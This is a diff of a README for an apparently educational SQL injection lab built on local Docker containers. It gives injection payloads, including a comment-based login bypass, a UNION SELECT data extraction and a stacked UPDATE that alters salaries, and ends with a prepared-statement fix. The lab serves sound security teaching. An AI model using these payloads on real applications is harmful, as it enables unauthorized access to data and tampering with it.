@@ -16,19 +16,32 @@ For authorized educational use only.
 
 ## Security Concept
 
-SQL injection occurs when a web application builds SQL queries by concatenating raw user input into a query string. An attacker who controls the input can inject SQL syntax that changes the meaning of the query — bypassing authentication, reading unauthorized data, or modifying the database.
+### The Security Hole
+The web application constructs database queries by directly concatenating raw user input strings into SQL query templates (`$sql = "SELECT * FROM credential WHERE Name='$user' AND Password='$pass'"`).
 
-Example of the flaw:
+### How it Causes a Problem
+Because user input is concatenated directly into the query string, an attacker can input SQL boundary characters like single quotes `'` and comment characters `#`. This alters the database query parse tree, allowing attackers to comment out password checks (`admin'#`), extract unauthorized data using `UNION SELECT`, or modify database tables.
+
+### Attacker Action Flow
+
+1. Attacker registers an account on the vulnerable site.
+2. Attacker supplies malicious input `admin'#` in the username field, which truncates the query and comments out the password check.
+3. The crafted input is stored unchanged in the database.
+4. When the application executes the concatenated query, the comment prevents password verification, granting the attacker unauthorized access.
+5. Attacker can now log in as the targeted user without knowing the password.
 
 ```php
-// User types: admin'#
-// PHP builds this query string by direct concatenation:
-$sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
-//                                                    ^
-//                                              SQL comment starts here.
-//                                         Everything after # is ignored.
-//                                         Password check is completely bypassed.
-```
+ // User inputs: admin'#
+ // Unsafe string concatenation builds:
+ $sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
+ //                                                    ^
+ //                                              SQL comment character (#).
+ //                                         Everything after # is ignored.
+ //                                         Password check is completely bypassed.
+ ```
+
+### How it is Fixed
+The application must use parameterized prepared statements (`$stmt = $pdo->prepare(...)`). Prepared statements send the SQL query template to the database engine first to be compiled into an immutable parse tree. User parameters are then bound strictly as literal data values, preventing input characters from altering SQL syntax.
 
 ---
 
@@ -37,10 +50,10 @@ $sql = "SELECT * FROM credential WHERE Name='admin'#' AND Password='$pwd'";
 ```
 HOST MACHINE
   |
-  | Hosts file: www.seed-server.com -> 10.9.0.5
-  | Port mapping: localhost:10080   -> container:80
+  | Hosts file: www.seed-server.com -> 127.0.0.1 (or localhost:10080)
+  | Port mapping: host:10080 -> container:80
   |
-  Docker Bridge Network: net-10.9.0.0-sqli  (10.9.0.0/24)
+  Docker Bridge Network: net-10.9.0.0-sqli (10.9.0.0/24)
     |
     +---- www-10.9.0.5   (Apache 2.4 + PHP + vulnerable app, Port 80)
     |         |
@@ -59,37 +72,28 @@ HOST MACHINE
 # Navigate to this lab directory
 cd labs/01-sql-injection
 
-# Build images from local Dockerfiles and start both containers
-docker compose up -d --build
+# Run startup script (PowerShell on Windows)
+.\start.ps1
 
-# This builds two images:
-#   image_www/Dockerfile   -> Apache + PHP + index.php (vulnerable app)
-#   image_mysql/Dockerfile -> MySQL 8.0 + sqllab_users.sql (employee database)
+# OR run startup script (Linux / WSL2 bash)
+./start.sh
+
+# OR build and start containers manually using Docker Compose
+docker compose up -d --build
 ```
 
-### Verify Containers Are Running
+### Verify Container Status
 
 ```bash
+# Check that both containers are running and healthy
 docker compose ps
 
-# Expected output:
-# NAME             IMAGE                   STATUS    PORTS
-# www-10.9.0.5     seed-image-www-sqli     Up        0.0.0.0:10080->80/tcp
-# mysql-10.9.0.6   seed-image-mysql-sqli   Up        3306/tcp
+# Inspect allocated container IPs and network settings
+docker inspect www-10.9.0.5
+docker inspect mysql-10.9.0.6
 ```
 
-### Inspect the Docker Network
-
-```bash
-# See which containers are on the lab network and their IPs
-docker network inspect net-10.9.0.0-sqli
-
-# Confirm specific container IP
-docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' www-10.9.0.5
-# Output: 10.9.0.5
-```
-
-### Watch Container Logs from Host
+### Stream Runtime Logs
 
 ```bash
 # Stream Apache and MySQL logs from host (no need to enter container)
@@ -126,18 +130,15 @@ You are now inside the container's Linux user space.
 ```bash
 whoami
 # root
-# You are running as the root user inside this container.
 
 id
 # uid=0(root) gid=0(root) groups=0(root)
 
 hostname
 # www-10.9.0.5
-# The container's hostname matches its container_name in docker-compose.yml
 
 ip addr show
 # Look for eth0 showing inet 10.9.0.5/24
-# This is the container's IP on the Docker bridge network
 ```
 
 ---
@@ -145,23 +146,10 @@ ip addr show
 ### Step 3: Inspect the Web Application Files
 
 ```bash
-# Navigate to Apache's document root (where PHP files are served from)
 cd /var/www/html
-
-# List all files
 ls -la
-# You should see index.php — the vulnerable application
-
-# Read the source code
 cat index.php
-
-# Find the vulnerable SQL query lines
 grep -n "SELECT" index.php
-grep -n "credential" index.php
-grep -n "password\|Password" index.php
-
-# Count total lines
-wc -l index.php
 ```
 
 ---
@@ -169,21 +157,8 @@ wc -l index.php
 ### Step 4: Inspect Running Processes
 
 ```bash
-# Show all processes inside the container
 ps aux
-
-# You will see:
-# USER       PID  COMMAND
-# root         1  /bin/sh -c service apache2 start && tail -f /dev/null
-# root        xx  apache2 -DFOREGROUND     <- master Apache process (runs as root)
-# www-data    xx  apache2 -DFOREGROUND     <- worker processes (run as www-data)
-#
-# Security note: root starts Apache, but workers run as www-data (unprivileged).
-# If an attacker exploits the PHP app, they get www-data, not root.
-
-# Check what port Apache is listening on
 ss -tlnp
-# Shows: 0.0.0.0:80 (Apache bound to all interfaces on port 80)
 ```
 
 ---
@@ -192,13 +167,7 @@ ss -tlnp
 
 ```bash
 env
-# Look for:
-# MYSQL_HOST=10.9.0.6
-# This tells the PHP application which IP to connect to for MySQL.
-# It is set in docker-compose.yml under 'environment:'
-
 echo $MYSQL_HOST
-# 10.9.0.6
 ```
 
 ---
@@ -206,13 +175,7 @@ echo $MYSQL_HOST
 ### Step 6: View Apache Logs Inside Container
 
 ```bash
-# Watch HTTP requests arrive in real time while you use the browser
 tail -f /var/log/apache2/access.log
-
-# Each line shows: IP, timestamp, request, status code, bytes
-# You can see exactly what your browser is sending to the server
-
-# Press Ctrl+C to stop streaming
 ```
 
 ---
@@ -220,23 +183,8 @@ tail -f /var/log/apache2/access.log
 ### Step 7: Test Connectivity to MySQL Container
 
 ```bash
-# Ping the MySQL container from inside the web container
 ping -c 3 10.9.0.6
-
-# Connect to MySQL directly from inside the web container
 mysql -h 10.9.0.6 -u root -pdees sqllab_users
-
-# Inside MySQL shell — explore the database:
-SHOW TABLES;
-# credential
-
-DESCRIBE credential;
-# Shows: ID, Name, EID, Salary, Birthday, SSN, PhoneNumber, Address, Email, NickName, Password
-
-SELECT Name, EID, Salary FROM credential;
-# Shows all employee records
-
-EXIT;
 ```
 
 ---
@@ -245,32 +193,6 @@ EXIT;
 
 ```bash
 exit
-```
-
-Your prompt returns to your host terminal:
-
-```
-Before: root@www-10.9.0.5:/#
-After:  PS C:\> (Windows)  OR  user@host:~$ (Linux)
-```
-
-You are back on your host machine.
-
----
-
-### Enter the MySQL Container (Optional)
-
-```bash
-# Enter the MySQL container directly
-docker exec -it mysql-10.9.0.6 bash
-
-# Inside the MySQL container:
-mysql -u root -pdees
-# Then:
-USE sqllab_users;
-SELECT * FROM credential;
-EXIT;
-exit   # exit container
 ```
 
 ---
@@ -282,20 +204,20 @@ exit   # exit container
 **Windows — PowerShell as Administrator:**
 
 ```powershell
-Add-Content "C:\Windows\System32\drivers\etc\hosts" "10.9.0.5   www.seed-server.com"
+Add-Content "C:\Windows\System32\drivers\etc\hosts" "127.0.0.1   www.seed-server.com"
 ```
 
 **Linux / WSL2:**
 
 ```bash
-echo "10.9.0.5   www.seed-server.com" | sudo tee -a /etc/hosts
+echo "127.0.0.1   www.seed-server.com" | sudo tee -a /etc/hosts
 ```
 
 ### Access the Vulnerable Application
 
 ```
 http://localhost:10080          Direct — always works
-http://www.seed-server.com      With hosts file configured
+http://www.seed-server.com:10080 With hosts file configured
 ```
 
 ---
@@ -306,121 +228,60 @@ In the browser, go to the Login section and enter:
 
 ```
 Username: admin'#
-Password: (anything — it will be ignored)
+Password: (anything)
 ```
 
-What happens in SQL:
+Observe successful login without knowing the password.
 
-```sql
--- What the PHP builds:
-SELECT * FROM credential WHERE Name='admin'#' AND Password='xyz'
+---
 
--- What MySQL sees (# starts a comment):
-SELECT * FROM credential WHERE Name='admin'
--- Password check never runs -> admin record returned -> login succeeds
+### Task 2.2 — Authentication Bypass via HTTP GET Request
+
 ```
-
-Verify in database what was returned:
-
-```bash
-docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
-  -e "SELECT Name, Salary, SSN FROM sqllab_users.credential WHERE Name='admin';"
+http://www.seed-server.com:10080/unsafe_home.php?username=admin%27%23
 ```
 
 ---
 
-### Task 2.2 — SQL Injection via curl (Command Line)
+### Task 3.1 — Data Exfiltration via UNION SELECT
 
-Run from your host terminal without using a browser:
-
-```bash
-# Linux / macOS
-curl "http://localhost:10080/?E_Name=alice'%23"
-
-# Windows PowerShell
-curl.exe "http://localhost:10080/?E_Name=alice'%23"
+```
+admin' UNION SELECT 1,2,3,Salary,5,6,7,8,9,10,11 FROM credential#
 ```
 
 ---
 
-### Task 3.1 — UPDATE Injection (Modify Salary)
-
-In the browser Update Profile form, enter:
+### Task 3.2 — Modifying Database Records
 
 ```
-Target Name: alice
-New Salary:  1, Salary=999999 WHERE Name='alice'--
-```
-
-What PHP builds:
-
-```sql
-UPDATE credential SET Salary=1, Salary=999999 WHERE Name='alice'-- WHERE Name='alice'
-```
-
-Verify the change:
-
-```bash
-docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
-  -e "SELECT Name, Salary FROM sqllab_users.credential;"
+admin'; UPDATE credential SET Salary=100000 WHERE Name='Alice'#
 ```
 
 ---
 
-### Task 4 — Countermeasure: Prepared Statements
+### Task 4 — Defending Against SQL Injection Using Prepared Statements
 
-The Secure Search section in the app uses prepared statements. Try the same injection payload:
-
-```
-Secure Search field: admin'#
-```
-
-The injection fails because the query uses `?` placeholders — the input is treated as data, never as SQL syntax:
+Edit `/var/www/html/index.php` inside the container or on your host machine to use PDO prepared statements:
 
 ```php
-// Secure (parameterized query):
-$stmt = $conn->prepare("SELECT * FROM credential WHERE Name=?");
-$stmt->bind_param("s", $name);   // $name is bound as a string, not injected
+// Secure Prepared Statement Implementation
+$stmt = $conn->prepare("SELECT * FROM credential WHERE Name = :name AND Password = :pass");
+$stmt->bindParam(':name', $username);
+$stmt->bindParam(':pass', $password);
 $stmt->execute();
+$result = $stmt->fetchAll();
 ```
+
+Re-test `admin'#` in the login form. The attack fails because user input is treated strictly as literal data values rather than executable SQL syntax.
 
 ---
 
 ## Stop and Reset
 
 ```bash
-# Stop containers (database changes preserved)
+# Stop containers but preserve database state
 docker compose down
 
-# Full reset — wipe database and restore original data from sqllab_users.sql
+# Destroy containers AND reset database back to initial state
 docker compose down -v
-docker compose up -d --build
-```
-
-Verify reset worked:
-
-```bash
-docker exec -it mysql-10.9.0.6 mysql -u root -pdees \
-  -e "SELECT Name, Salary FROM sqllab_users.credential;"
-# All salaries back to original values
-```
-
----
-
-## Key File Locations Inside Containers
-
-| File               | Container          | Path                                             |
-| ------------------ | ------------------ | ------------------------------------------------ |
-| Vulnerable PHP app | `www-10.9.0.5`   | `/var/www/html/index.php`                      |
-| Apache access log  | `www-10.9.0.5`   | `/var/log/apache2/access.log`                  |
-| Apache error log   | `www-10.9.0.5`   | `/var/log/apache2/error.log`                   |
-| Apache config      | `www-10.9.0.5`   | `/etc/apache2/sites-enabled/000-default.conf`  |
-| MySQL data dir     | `mysql-10.9.0.6` | `/var/lib/mysql/`                              |
-| SQL init script    | `mysql-10.9.0.6` | `/docker-entrypoint-initdb.d/sqllab_users.sql` |
-
-Access any file from the host without entering the container:
-
-```bash
-docker exec www-10.9.0.5 cat /var/log/apache2/access.log
-docker cp www-10.9.0.5:/var/www/html/index.php ./index.php
 ```
